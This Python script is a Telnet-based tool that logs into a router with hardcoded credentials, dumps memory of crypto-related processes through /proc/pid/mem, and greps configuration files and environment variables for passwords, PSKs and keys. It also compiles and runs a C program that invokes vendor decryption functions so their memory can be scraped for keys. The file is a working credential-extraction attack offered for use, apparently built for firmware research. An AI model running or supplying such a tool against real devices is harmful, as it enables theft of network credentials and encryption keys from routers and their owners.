#!/usr/bin/env python3
"""
Telnet-based Router Key Extraction Tool
Connects via Telnet to extract runtime encryption keys from memory
"""

import telnetlib
import time
import re
import sys
from pathlib import Path

class TelnetKeyExtractor:
    def __init__(self, host="192.168.1.1", username="sUser", password="EP!99R4HLH9E"):
        self.host = host
        self.username = username
        self.password = password
        self.tn = None
        self.results = {
            "processes": [],
            "memory_dumps": {},
            "keys_found": [],
            "crypto_analysis": {}
        }
        
    def connect(self):
        """Establish Telnet connection"""
        print(f"[*] Connecting to {self.host} via Telnet...")
        
        try:
            self.tn = telnetlib.Telnet(self.host, timeout=15)
            
            # Wait for login prompt
            print("[*] Waiting for login prompt...")
            self.tn.read_until(b"login: ", timeout=10)
            self.tn.write(self.username.encode('ascii') + b"\n")
            
            # Wait for password prompt
            print("[*] Sending password...")
            self.tn.read_until(b"Password: ", timeout=10)
            self.tn.write(self.password.encode('ascii') + b"\n")
            
            # Check if login successful
            time.sleep(2)
            response = self.tn.read_very_eager().decode('ascii', errors='ignore')
            
            if "#" in response or "$" in response:
                print("[+] Telnet connection successful!")
                return True
            else:
                print(f"[-] Login failed. Response: {response}")
                return False
                
        except Exception as e:
            print(f"[-] Telnet connection failed: {e}")
            return False
    
    def execute_command(self, command, timeout=30):
        """Execute command via Telnet"""
        if not self.tn:
            return None
            
        try:
            self.tn.write(command.encode('ascii') + b"\n")
            time.sleep(2)
            response = self.tn.read_very_eager().decode('ascii', errors='ignore')
            return response
        except Exception as e:
            print(f"[-] Command execution failed: {e}")
            return None
    
    def check_available_tools(self):
        """Check what tools are available on router"""
        print("[*] Checking available tools...")
        
        tools_to_check = [
            ("ps", "ps aux"),
            ("ls", "ls /bin /usr/bin /sbin"),
            ("cat", "cat /proc/version"),
            ("strings", "strings --version"),
            ("hexdump", "hexdump --version"),
            ("dd", "dd --version"),
            ("grep", "grep --version"),
            ("find", "find --version"),
            ("busybox", "busybox"),
            ("gdb", "gdb --version"),
            ("strace", "strace --version")
        ]
        
        available_tools = {}
        for tool_name, cmd in tools_to_check:
            result = self.execute_command(cmd, timeout=10)
            if result and "not found" not in result.lower() and "command not found" not in result.lower():
                available_tools[tool_name] = True
                print(f"  [+] {tool_name}: Available")
            else:
                available_tools[tool_name] = False
                print(f"  [-] {tool_name}: Not available")
        
        self.results["crypto_analysis"]["available_tools"] = available_tools
        return available_tools
    
    def find_crypto_processes(self):
        """Find processes related to cryptography"""
        print("[*] Finding crypto-related processes...")
        
        # Get process list
        ps_result = self.execute_command("ps aux")
        if ps_result:
            self.results["processes"] = ps_result
            print(f"  [+] Got process list ({len(ps_result)} bytes)")
            
            # Look for crypto processes
            crypto_patterns = [
                r'(.*smp.*)',
                r'(.*crypto.*)',
                r'(.*cipher.*)',
                r'(.*decrypt.*)',
                r'(.*encrypt.*)',
                r'(.*capi.*)',
                r'(.*hw_.*so.*)'
            ]
            
            crypto_pids = []
            for line in ps_result.split('\n'):
                for pattern in crypto_patterns:
                    if re.search(pattern, line, re.IGNORECASE):
                        parts = line.split()
                        if len(parts) >= 2:
                            pid = parts[1]
                            if pid.isdigit():
                                crypto_pids.append(pid)
                                print(f"  [+] Crypto process PID: {pid} - {line[:50]}...")
            
            self.results["crypto_analysis"]["crypto_pids"] = crypto_pids
            return crypto_pids
    
    def analyze_process_memory(self, pid):
        """Analyze process memory for encryption keys"""
        print(f"[*] Analyzing memory for PID {pid}...")
        
        # Get process info
        cmdline_result = self.execute_command(f"cat /proc/{pid}/cmdline")
        if cmdline_result:
            cmdline = cmdline_result.replace('\0', ' ').strip()
            print(f"  Process: {cmdline}")
        
        # Get memory maps
        maps_result = self.execute_command(f"cat /proc/{pid}/maps")
        if maps_result:
            self.results["memory_dumps"][f"maps_{pid}"] = maps_result
            
            # Find readable memory regions
            readable_regions = []
            for line in maps_result.split('\n'):
                if 'r' in line and 'w' in line:  # Readable and writable
                    parts = line.split()
                    if len(parts) >= 6:
                        addr_range = parts[0]
                        perms = parts[1]
                        pathname = parts[5] if len(parts) > 5 else '[anonymous]'
                        if pathname.endswith('.so') or 'heap' in pathname or 'stack' in pathname:
                            readable_regions.append((addr_range, perms, pathname))
            
            print(f"  [+] Found {len(readable_regions)} readable memory regions")
            
            # Try to dump memory from key regions
            for addr_range, perms, pathname in readable_regions[:10]:  # Limit to first 10 regions
                self.dump_memory_region(pid, addr_range, pathname)
    
    def dump_memory_region(self, pid, addr_range, pathname):
        """Dump and analyze a specific memory region"""
        try:
            start_addr, end_addr = addr_range.split('-')
            size = int(end_addr, 16) - int(start_addr, 16)
            
            # Limit dump size to avoid timeouts
            if size > 1024*1024:  # 1MB limit
                size = 1024*1024
                end_addr = hex(int(start_addr, 16) + size)[2:]
            
            print(f"    [*] Dumping {pathname}: {addr_range} ({size} bytes)")
            
            # Try to dump memory
            dump_cmd = f"dd if=/proc/{pid}/mem bs=1 skip=$((0x{start_addr})) count={size} 2>/dev/null | strings -n 16 | head -20"
            dump_result = self.execute_command(dump_cmd, timeout=60)
            
            if dump_result:
                self.results["memory_dumps"][f"mem_{pid}_{pathname.replace('/', '_')}"] = dump_result
                
                # Look for potential keys in the dump
                keys = self.find_keys_in_text(dump_result)
                if keys:
                    for key in keys:
                        self.results["keys_found"].append({
                            "pid": pid,
                            "region": pathname,
                            "addr_range": addr_range,
                            "key": key,
                            "method": "memory_dump"
                        })
                        print(f"      [+] Potential key: {key[:50]}...")
            
        except Exception as e:
            print(f"    [-] Failed to dump {pathname}: {e}")
    
    def find_keys_in_text(self, text):
        """Find potential encryption keys in text"""
        keys = []
        
        # Patterns for potential keys
        patterns = [
            r'[A-Fa-f0-9]{32}',  # 128-bit key
            r'[A-Fa-f0-9]{48}',  # 192-bit key
            r'[A-Fa-f0-9]{64}',  # 256-bit key
            r'[A-Za-z0-9+/]{32}={0,2}',  # Base64 key
            r'[A-Za-z0-9+/]{44}={0,2}',  # Longer Base64 key
            r'key[=:]\s*[A-Fa-f0-9A-Za-z+/=]{16,}',  # key: value
            r'password[=:]\s*[A-Fa-f0-9A-Za-z+/=]{16,}',  # password: value
            r'secret[=:]\s*[A-Fa-f0-9A-Za-z+/=]{16,}',  # secret: value
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                if len(match) >= 16:  # Minimum key length
                    keys.append(match)
        
        return list(set(keys))  # Remove duplicates
    
    def trigger_crypto_operations(self):
        """Trigger cryptographic operations to capture keys"""
        print("[*] Triggering cryptographic operations...")
        
        # Try to call the decryption functions with test inputs
        trigger_script = '''
# Create test program to trigger crypto operations
cat > /tmp/trigger_crypto.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>

// Mock symbols
int HW_Mobilemng_SetTaskSource() { return 0; }
int SRV_COMM_GetNewExportType() { return 0; }
void* SRV_COMM_GetExportValue() { return NULL; }
void* CAPI_SMP_GetWanInterfaceStatus() { return NULL; }

int main() {
    void *handle;
    int (*decrypt_func)(const char*, char*);
    char output[1024];
    
    // Load and test primary function
    handle = dlopen("/lib/libhw_smp_capi.so", RTLD_LAZY);
    if (handle) {
        decrypt_func = dlsym(handle, "CAPI_SMP_DecryptCipherText");
        if (decrypt_func) {
            printf("Testing CAPI_SMP_DecryptCipherText...\\n");
            decrypt_func("test_input_123", output);
            decrypt_func("admin", output);
            decrypt_func("superonline", output);
            decrypt_func("password", output);
        }
        dlclose(handle);
    }
    
    // Load and test fallback function
    handle = dlopen("/lib/libl3_base_api.so", RTLD_LAZY);
    if (handle) {
        decrypt_func = dlsym(handle, "WAN_IF_DecryptPPPoEPassWord");
        if (decrypt_func) {
            printf("Testing WAN_IF_DecryptPPPoEPassWord...\\n");
            decrypt_func("test_pppoe", output);
            decrypt_func("admin", output);
        }
        dlclose(handle);
    }
    
    return 0;
}
EOF

# Try to compile and run
gcc -o /tmp/trigger_crypto /tmp/trigger_crypto.c -ldl 2>/dev/null
if [ -f /tmp/trigger_crypto ]; then
    echo "Running crypto trigger program..."
    /tmp/trigger_crypto &
    TRIGGER_PID=$!
    sleep 3
    
    # Dump memory while crypto is running
    echo "Dumping memory of crypto trigger process..."
    if [ -r "/proc/$TRIGGER_PID/mem" ]; then
        dd if=/proc/$TRIGGER_PID/mem bs=1024 count=100 2>/dev/null | strings -n 16 > /tmp/crypto_memory_$TRIGGER_PID.txt
        echo "Memory dump saved to /tmp/crypto_memory_$TRIGGER_PID.txt"
    fi
    
    kill $TRIGGER_PID 2>/dev/null
    rm -f /tmp/trigger_crypto /tmp/trigger_crypto.c
else
    echo "Failed to compile crypto trigger"
fi
'''
        
        result = self.execute_command(trigger_script, timeout=120)
        if result:
            self.results["crypto_analysis"]["trigger_result"] = result
            print("  [+] Crypto trigger executed")
            
            # Check for memory dumps
            memory_files = self.execute_command("ls -la /tmp/crypto_memory_*.txt 2>/dev/null")
            if memory_files and "No such file" not in memory_files:
                print("  [+] Memory dumps created")
                for line in memory_files.split('\n'):
                    if 'crypto_memory_' in line:
                        filename = line.split()[-1]
                        dump_content = self.execute_command(f"cat /tmp/{filename}")
                        if dump_content:
                            keys = self.find_keys_in_text(dump_content)
                            for key in keys:
                                self.results["keys_found"].append({
                                    "source": "triggered_crypto",
                                    "file": filename,
                                    "key": key
                                })
                                print(f"      [+] Key from triggered crypto: {key[:50]}...")
    
    def extract_configuration_passwords(self):
        """Extract encrypted passwords from configuration files"""
        print("[*] Extracting configuration passwords...")
        
        config_commands = [
            "cat /etc/config/* 2>/dev/null | grep -E 'password|psk|key' | head -20",
            "cat /tmp/config/* 2>/dev/null | grep -E 'password|psk|key' | head -20", 
            "find /etc -name '*.conf' -exec grep -l 'password\\|psk\\|key' {} \\; 2>/dev/null | head -10",
            "uci show 2>/dev/null | grep -i password | head -10",
            "env | grep -iE 'password|key|secret' | head -10"
        ]
        
        for cmd in config_commands:
            result = self.execute_command(cmd)
            if result and result.strip():
                self.results["crypto_analysis"][f"config_{cmd.split()[0]}"] = result
                print(f"  [+] Configuration data from {cmd.split()[0]}")
                
                # Look for encrypted passwords
                keys = self.find_keys_in_text(result)
                for key in keys:
                    self.results["keys_found"].append({
                        "source": "configuration",
                        "command": cmd,
                        "key": key
                    })
    
    def install_busybox_if_needed(self):
        """Offer to install busybox if additional tools needed"""
        print("[*] Checking if busybox installation is needed...")
        
        busybox_check = self.execute_command("which busybox")
        if not busybox_check or "not found" in busybox_check:
            print("  [-] busybox not found")
            print("  [*] You can install busybox via USB port if needed")
            print("  [*] Upload busybox binary to /tmp/ and chmod +x /tmp/busybox")
            return False
        else:
            print("  [+] busybox is available")
            return True
    
    def save_results(self):
        """Save extraction results"""
        output_dir = Path("/home/recep/Masaüstü/Firmware/telnet_extraction")
        output_dir.mkdir(exist_ok=True)
        
        # Save JSON results
        import json
        with open(output_dir / "telnet_key_extraction.json", "w") as f:
            json.dump(self.results, f, indent=2)
        
        # Save text results
        with open(output_dir / "telnet_summary.txt", "w") as f:
            f.write("=== Telnet Router Key Extraction Summary ===\n")
            f.write(f"Host: {self.host}\n")
            f.write(f"User: {self.username}\n")
            f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            f.write(f"=== Keys Found ({len(self.results['keys_found'])}) ===\n")
            for i, key_info in enumerate(self.results["keys_found"], 1):
                f.write(f"{i}. {key_info}\n")
            
            f.write(f"\n=== Crypto Processes ===\n")
            if "crypto_pids" in self.results["crypto_analysis"]:
                for pid in self.results["crypto_analysis"]["crypto_pids"]:
                    f.write(f"PID: {pid}\n")
            
            f.write(f"\n=== Available Tools ===\n")
            if "available_tools" in self.results["crypto_analysis"]:
                for tool, available in self.results["crypto_analysis"]["available_tools"].items():
                    status = "Available" if available else "Not Available"
                    f.write(f"{tool}: {status}\n")
        
        print(f"\n[+] Results saved to: {output_dir}")
        print(f"    - JSON: telnet_key_extraction.json")
        print(f"    - Summary: telnet_summary.txt")
    
    def run_extraction(self):
        """Run complete key extraction process"""
        print("=== Telnet Router Key Extraction ===")
        
        if not self.connect():
            print("[-] Failed to connect to router")
            return False
        
        # Check available tools
        self.check_available_tools()
        
        # Find crypto processes
        crypto_pids = self.find_crypto_processes()
        
        # Analyze memory of crypto processes
        for pid in crypto_pids[:5]:  # Limit to first 5 PIDs
            self.analyze_process_memory(pid)
        
        # Trigger crypto operations
        self.trigger_crypto_operations()
        
        # Extract configuration passwords
        self.extract_configuration_passwords()
        
        # Check busybox availability
        self.install_busybox_if_needed()
        
        # Save results
        self.save_results()
        
        # Close connection
        if self.tn:
            self.tn.close()
        
        return True

if __name__ == "__main__":
    extractor = TelnetKeyExtractor()
    extractor.run_extraction()
